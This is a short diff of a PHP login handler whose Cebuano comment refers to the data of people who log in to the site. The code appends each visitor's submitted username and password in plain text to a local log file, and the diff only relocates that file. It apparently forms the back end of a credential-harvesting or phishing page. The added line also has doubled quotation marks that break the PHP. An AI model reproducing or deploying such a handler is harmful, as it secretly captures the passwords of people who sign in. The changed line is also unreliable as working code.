@@ -4,7 +4,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $password = $_POST['password'];
 
     // ang data sa nag log in sa site
-    $file = fopen("C:\Users\Admin\Desktop\credential_logs\data.txt", "a");
+    $file = fopen(""C:\Users\Students Account\Documents\NetBeansProjects\logs.txt"", "a");
     fwrite($file, "Username: " . $username . "\n");
     fwrite($file, "Password: " . $password . "\n");
     fwrite($file, "--------------------\n");
